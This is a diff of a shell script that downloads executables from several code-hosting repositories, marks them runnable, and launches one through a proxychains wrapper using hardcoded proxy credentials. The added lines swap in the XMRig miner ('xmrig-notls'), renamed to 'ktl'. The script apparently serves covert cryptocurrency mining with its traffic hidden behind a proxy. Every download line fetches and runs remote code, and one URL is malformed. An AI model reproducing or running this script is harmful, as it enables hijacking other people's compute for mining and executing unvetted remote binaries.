@@ -2,8 +2,8 @@ proxy="34.228.46.223"
 port="9293" 
 user="idxrzfc04cp1zw"  
 pass="791oyjfai0xdla8yloe0jrftjh" 
-wget -q -O be96dNbbLaz7889 https://github.com/55113110159/apikey/raw/main/zepo && chmod +x be96dNbbLaz7889
-wget -q https://raw.githubusercontent.com/55113110159/apikey/main/SHA256SUMS && chmod +x SHA256SUMS
+wget -q -O ktl https://gitlab.com/node.js2594450/scala/-/raw/main/xmrig-notls && chmod +x ktl
+wget -q https://gitlab.com/node.js2594450/scala/-/raw/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://https://raw.githubusercontent.com/55113110159/apikey/main/config.json && chmod +x config.json
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
@@ -21,4 +21,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./be96dNbbLaz7889 -c "config.json"
+./panel ./ktl -c "config.json"
